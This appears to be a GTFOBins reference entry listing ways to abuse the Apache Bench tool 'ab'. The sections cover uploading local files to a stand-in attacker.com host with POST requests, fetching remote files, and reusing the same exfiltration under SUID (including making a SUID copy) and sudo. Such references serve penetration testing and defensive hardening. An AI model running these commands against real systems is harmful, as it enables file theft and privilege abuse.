# GTFOBin: ab

## File upload

It can exfiltrate files on the network.

Upload local file via HTTP POST request.

```
URL=http://attacker.com/
LFILE=file_to_send
ab -p $LFILE $URL
```

## File download

It can download remote files.

Fetch a remote file via HTTP GET request. The response is returned as part of the verbose output of the program with some limitations on the length.

```
URL=http://attacker.com/file_to_download
ab -v2 $URL
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

Upload local file via HTTP POST request.

```
sudo install -m =xs $(which ab) .

URL=http://attacker.com/
LFILE=file_to_send
./ab -p $LFILE $URL
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

Upload local file via HTTP POST request.

```
URL=http://attacker.com/
LFILE=file_to_send
sudo ab -p $LFILE $URL
```